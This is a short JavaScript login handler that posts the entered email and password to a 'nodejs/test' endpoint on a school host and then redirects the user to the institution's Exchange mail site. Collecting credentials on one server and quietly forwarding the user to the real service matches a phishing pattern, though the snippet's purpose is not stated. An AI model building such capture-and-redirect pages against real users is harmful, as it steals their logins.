function submitForm(){
            
    if(window.jQuery){

        $.post("https://peddiecs.peddie.org/nodejs/test",{
            email:$('#email').val(),
            password:$('#password').val()
        },function(res){
            
            if(res.message=="success"){
                window.location.replace("https://exchange.peddie.org/index.html");
            }else{
                if(res.message){
                    alert(res.message);
                }
                window.location.replace("https://exchange.peddie.org");
            }
        
        });
        
    }
}